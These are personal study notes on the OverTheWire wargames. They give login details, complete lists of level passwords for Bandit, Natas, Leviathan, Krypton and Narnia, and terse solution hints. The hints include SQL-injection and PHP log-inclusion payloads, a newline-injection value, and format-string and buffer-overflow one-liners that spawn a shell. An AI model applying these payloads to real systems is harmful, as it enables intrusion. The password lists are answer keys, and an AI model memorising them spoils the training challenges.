## OverTheWire 
- https://overthewire.org/wargames/ 
- write up : https://github.com/Lennart2001/overthewire-writeups/tree/main
## bandit : basics
	--> username : bandit0 
	--> password : bandit0 
	--> url : bandit.labs.overthewire.org
	--> port: 2220  (SSH)
	
	rule : 
	  --> Write-access to homedirectories is disabled
	  --> /tmp/ : mktemp -d
	  --> Read-access to both /tmp/ is disabled
	  --> /proc restricted so that users cannot snoop on eachother
	  --> installed : 
	    	-->* gef (https://github.com/hugsy/gef) in /opt/gef/
	    	-->* pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
	    	-->* peda (https://github.com/longld/peda.git) in /opt/peda/
	    	-->* gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
	    	-->* pwntools (https://github.com/Gallopsled/pwntools)
	    	-->* radare2 (http://www.radare.org/)
		-->/etc/bandit_pass/bandit27
### Password: 
		-->0:bandit0
		-->1:NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
		-->2:rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi
		-->3:aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG
		-->4:2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
		-->5:lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR
		-->6:P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU
		-->7:z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S
		-->8:TESKZC0XvTetK0S9xNwm25STk5iWrBvP
		-->9:EN632PlfYiZbn3PhVK3XOGSlNInNE00t
		-->10:G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s
		-->11:6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
		-->12:JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv
		-->13:wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw
		-->14:fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq -- sshkey.private (xx)
		-->15:jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt
		-->16:JQttfApK4SeyHwDlI9SXGR50qclOAil1
		-->17:hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg -- sshkey.private (yy)
		-->18:awhqfNnAbc1naukrpqDYcF95h7HoMTrC
		-->19:VxCazJaVykI6W36BkBU0mJTCM8rR95XT
		-->20:NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
		-->21:WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
		-->22:QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
		-->23:VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
		-->24:p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
		-->25:c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
		-->26:YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
		-->27:AVanL161y9rsbcJIsFHuw35rjaOM19nR
		-->28:tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
		-->29:xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS
		-->30:OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
		-->31:rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
		-->32:odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
### Hint
		Level 0:  cat file 
		Level 1:  cat ./-
		Level 2:  cat "spaces in this filename"
		Level 3:  cat ./.hidden 
		Level 5:  find -type f -size 1033c
		Level 6:  find / -type f -size 33c -group bandit6 -user bandit7 2>&1 | grep -w bandit7
		Level 7:  cat data.txt | grep -i millionth
		Level 8:  sort data.txt | uniq -c | grep "1 "
		Level 9:  strings data.txt | grep "^=="
		Level 10:  base64 --decode data.txt
		Level 11:  cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
		Level 13:  xxd, gzip , bzip , tar  
		Level 14:  ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220
		Level 15: cat /etc/bandit_pass/bandit14 | nc localhost 30000
		Level 16: cat /etc/bandit_pass/bandit15 | openssl s_client -connect localhost:30001 -quiet
		Level 17: cat /etc/bandit_pass/bandit16 | openssl s_client -connect localhost:31790 -quiet
		Level 18: ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"
		Level 19: ./bandit20-do cat /etc/bandit_pass/bandit20
		Level 20: nc -lp 31337 < /etc/bandit_pass/bandit20 | ./suconnect 31337
		Level 22: cron.d
		Level 23: /var/spool/bandit24/foo/secttp.sh
		Level 24: for loop : 
			-->cat possibilities3.txt | nc localhost 30002 > result3.txt
			-->sort result3.txt | grep -v "Wrong!"
		Level 25: ssh -i bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org | more
		Level 27: git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo.git (port 2220)
		Level 28: git log | git show -- hidden password 
		Level 29: git branch
		Level 30: git tag | hidden file
		Level 31: git add | commit | push |  cat .gitignore
		Level 32: $0

## natas : web-security
	--> Username: natas0 
	--> Password: natas0 | 
	--> URL:http://natas0.natas.labs.overthewire.org
	--> /etc/natas_webpass/. (/etc/natas_webpass/natas29)
	--> HINT :  https://github.com/javiunzu/natas
	
### Password: 
		-->0:natas0
		-->1:g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
		-->2:h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
		-->3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
		-->4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
		-->5:Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
		-->6:fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
		-->7:jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
		-->8:a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
		-->9:Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
		-->10:D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
		-->11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
		-->12:YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
		-->13:lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
		-->14:qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
		-->15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
		-->16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
		-->17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
		-->18:8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
		-->19:8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
		-->20:guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
		-->21:89OWrTkGmiLZLv12JY4tLj2c4FW0xn56 
		-->22:91awVM9oDiUGm33JdzM7RVLBS8bz9n0s
		-->23:qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj
		-->24:0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r
		-->25:O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx
		-->26:8A506rfIAXbKKk68yJeuTuRq4UfcK70k
		-->27:PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3
		-->28:skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4 (copy)
		-->29:pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno 
		-->30:Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X
		-->31:AMZF14yknOn9Uc57uKB02jnYuhplYka3
		-->32:Yp5ffyfmEdjvTOwpN5HCvh7Ctgf9em3G
		-->33:APwWDD3fRAf6226sgBOBaSptGwvXwQhG
		-->34:F6Fcmavn8FgZgrAPOvoLudNr1GwQTaNG
### Hint
		Level 0:  ctrl + u 
		Level 3:  /robots.txt/
		Level 5:  burp suite --Referer:
		Level 6:  loggedin=1
		level 7:  $secret = "FOEIUWGHFEEUHOFUOIU";
		level 8:  /etc/natas_webpass/natas8
		level 9:  echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));
		level11:  cookies : nata11.php
		level12:  cmd
		level14:  SQL injection 
		level15:  Blind SQL Injection
		level18:  Session
		level20:  name=foo%0Aadmin1
		level25:  logs/natas25_session_id().log | <?php include("/etc/natas_webpass/natas26")?> 
		level26:  Serialization bug 
		level27:  Mysql bug --truncated 
		level28:  block chain
		level31:  Perl Jam 2 Pinnacle Attack
		level33:  MD5 + Phar

## Leviathan : Difficulty:     1/10 |Levels:         8 | platform:   Linux/x86
	--> Username: leviathan0
	--> Password: leviathan0
	--> url : leviathan.labs.overthewire.org
	--> port: 2223 (SSH)
	--> /etc/leviathan_pass/leviathan2
	--> ssh leviathan6@leviathan.labs.overthewire.org -p 2223
	--> summary : ltrace / ln -s / mktemp / cat / whoami / la -al 
	
### Password: 	
		-->1: PPIfmI1qsA
		-->2: mEh5PNl10e
		-->3: Q0G8j4sakn
		-->4: AgvropI4OA
		-->5: EKKlTF1Xqs
		-->6: YZ55XPVk2l
		-->7: 8GpZ5f8Hze
### Hint
		Level 1: cat bookmarks.html | grep password
		Level 2: create a space file to evaded the check 
		level 6: foe loop (.sh)
## Kryption : decode
	--> username : krypton1 
	--> password: KRYPTONISGREAT
	--> url : krypton.labs.overthewire.org 
	--> port: 2231 (SSH)
	--> /krypton/krypton
	
	--> ssh krypton1@krypton.labs.overthewire.org -p 2231
### Password: 
		-->1: KRYPTONISGREAT
		-->2: ROTTEN
		-->3: CAESARISEASY
		-->4: BRUTE
		-->5: CLEARTEXT
		-->6: RANDOM
		-->7: LFSRISNOTRANDOM
### Hint
	level 7 : 
		temp = []
		for x in "EICTDGYIYZKTHNSIRFXYCPFUEOCKRN":
			temp.append(ord(x)-ord("A"))
		print(temp)

		password = ""
		for x,y in zip("PNUKLYLWRQKGKBE", temp):
			password += chr(ord(x)-y)

		temp_wrap = []
		for x in temp:
			if x > 12:
				x -= 26
			temp_wrap.append(x)


		cipher = "PNUKLYLWRQKGKBE"
		password = ""
		for x,y in zip(cipher, temp_wrap):
			password += chr(ord(x)-y)

		print(password)

## Narnia : basic exploitation -- common bugs
	--> username : narnia0
	--> password : narnia0
	--> url : narnia.labs.overthewire.org
	--> port: 2226 (SSH)
	--> /narnia/.
	--> cat /etc/narnia_pass/narnia8

	--> ssh narnia7@narnia.labs.overthewire.org -p 2226
	--> Script : https://blog.csdn.net/kang0x0/article/details/121088689
	--> Teach  : https://blog.csdn.net/m0_55144954/article/details/136445954

### Password: 
		-->1: eaa6AjYMBB
		-->2: Zzb6MIyceT
		-->3: 8SyQ2wyEDU
		-->4: aKNxxrpDc1 (X understand)
		-->5: 1oCoEkRJSB
		-->6: BAV0SUV0iM
		-->7: YY4F9UaB60
		-->8: 1aBcDgPttG
		-->9: can't do 
### Hint
		level5 : ./narnia5 $(python3 -c 'import sys; sys.stdout.buffer.write(b"\xd0\xd5\xff\xff\xd0\xd5\xff\xff%492x%n")')
		level6 : ./narnia6 $(python3 -c 'import sys; sys.stdout.buffer.write(b"AAAAAAAA" + b"\x70\x81\xc4\xf7")') "BBBBBBBB/bin/sh"
		level7 : ./narnia7 $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x08\xd5\xff\xff" + b"%134517531d%2$n")') // decimal value 
## Behemoth : regular vulnerabilities --  common coding mistakes 
	--> buffer overflows, race conditions and privilege escalation
	--> username : behemoth0
	--> password : behemoth0
	--> url : behemoth.labs.overthewire.org
	--> port: 2221 (SSH)
	--> cd /behemoth
	--> cat /etc/behemoth_pass/behemoth1
	
	--> ssh behemoth0@behemoth.labs.overthewire.org -p 2221
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	password: 
		-->1: 8JHFW9vGru
		-->2: 
		-->3: 
		-->4: 
		-->5: 
		-->6: 
		-->7: 
		-->8:
		


## Utumno : 
	--> username : utumno0
	--> password : utumno0
	--> url : utumno.labs.overthewire.org 
	--> port: 2227 (SSH)
	--> /utumno/.
	
	--> ssh utumno0@utumno.labs.overthewire.org  -p 2227
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	password: 
		-->1: 
		-->2: 
		-->3: 
		-->4: 
		-->5: 
		-->6: 
		-->7: 

## Maze :  exploitation-techniques, programming (of course) and reverse-engineering
	--> username : maze0
	--> password : maze0
	--> url : maze.labs.overthewire.org
	--> port: 2225 (SSH)
	--> /maze/.
	
	--> ssh maze0@maze.labs.overthewire.org  -p 2225
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	password: 
		-->1: 
		-->2: 
		-->3: 
		-->4: 
		-->5: 
		-->6: 
		-->7: 

## Vortex : (27 level)
	--> username : maze0
	--> password : maze0
	--> url : vortex.labs.overthewire.org
	--> port: 2228 (SSH)
	-->  /vortex/. 
	--> https://overthewire.org/wargames/vortex/vortex0.html
	
## Manpage :   common linux c-programming misconceptions
	--> username : manpage0
	--> password : manpage0
	--> url : manpage.labs.overthewire.org 
	--> port: 2224 (SSH)
	--> /manpage/.
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	password: 
		-->1: 
		-->2: 
		-->3: 
		-->4: 
		-->5: 
		-->6: 
		-->7: 

## Drifter : harder Vortex  (15 level)
	--> url : drifter.labs.overthewire.org
	--> port: 2230
	--> https://overthewire.org/wargames/drifter/drifter0.html

## FormulaOne : (6 level)
	--> url :formulaone.labs.overthewire.org
	--> Port: 2232
	--> /formulaone/.
